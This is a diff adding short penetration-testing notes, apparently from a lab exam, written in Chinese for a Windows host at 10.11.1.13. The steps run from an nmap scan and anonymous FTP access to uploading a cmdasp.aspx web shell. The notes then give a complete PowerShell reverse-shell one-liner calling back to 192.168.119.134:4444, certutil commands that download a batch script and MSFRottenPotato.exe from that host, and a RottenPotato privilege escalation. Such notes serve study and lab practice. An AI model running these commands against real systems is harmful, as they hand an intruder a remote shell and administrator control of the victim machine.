@@ -1,0 +1,15 @@
+nmap -sC -sV -Pn 10.11.1.13 > nmap.txt
+
+1.nmap掃描發現有ftp服務,使用anonymous登入後下載所有檔案
+2.直接嘗試4167端口發現可以直接訪問
+3.上傳cmdasp.aspx,訪問http://10.11.1.13/cmdasp.aspx
+4.執行命令取得reverse shell
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.119.134',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+5.將potato及bat傳到目標目標機後,取得root權限
+
+
+
+C:\users\public\MSFRottenPotato.exe * C:\users\public\shell.bat
+
+certutil.exe -urlcache -split -f http://192.168.119.134/shell.bat shell.bat
+certutil.exe -urlcache -split -f http://192.168.119.134/MSFRottenPotato.exe  MSFRottenPotato.exe
